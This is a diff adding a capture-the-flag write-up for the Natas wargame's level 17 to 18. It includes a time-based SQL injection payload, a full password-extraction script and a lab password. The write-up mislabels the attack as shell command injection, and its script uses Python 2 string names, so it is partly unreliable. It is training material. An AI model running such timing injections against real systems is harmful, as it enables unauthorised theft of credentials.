@@ -464,3 +464,53 @@ This will build the password one character at a time until complete.
 		print(f"[✓] Final password: {''.join(seen_password)}")
 
 This will gradually build the password for the next level.
+
+### Natas Level 17 → Level 18  
+
+**Key Takeaways**  
+This level demonstrates **blind command injection** via timing attacks. The server does not return command output, but the attacker can infer results based on response delays (e.g., using `sleep`). This teaches the importance of defending against time-based side channels.
+
+---
+
+**Procedure**
+
+1. Log in using the username `natas17` and the password obtained from Level 16.
+
+2. The page has a form that passes input to a shell command. Although output is hidden, timing can be observed.
+
+3. The attack script sends:
+    ```
+    natas18" AND BINARY password LIKE "<prefix>" AND SLEEP(1) #
+    ```
+    - If the password prefix is correct, the server sleeps for 1 second.
+    - Otherwise, it responds immediately.
+
+4. The script logic:
+    
+    import requests
+    from string import *
+    from time import time
+
+    characters = lowercase + uppercase + digits
+
+    username = 'natas17'
+    password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
+    url = 'http://%s.natas.labs.overthewire.org/' % username
+
+    session = requests.Session()
+    seen_password = list()
+
+    while len(seen_password) < 32:
+        for character in characters:
+            start_time = time()
+            response = session.post(
+                url,
+                data={"username": 'natas18" AND BINARY password LIKE "' + "".join(seen_password) + character + '%" AND SLEEP(1) # '},
+                auth=(username, password)
+            )
+            end_time = time()
+            if end_time - start_time > 1:
+                seen_password.append(character)
+                print("Current password: " + "".join(seen_password))
+                break
+    
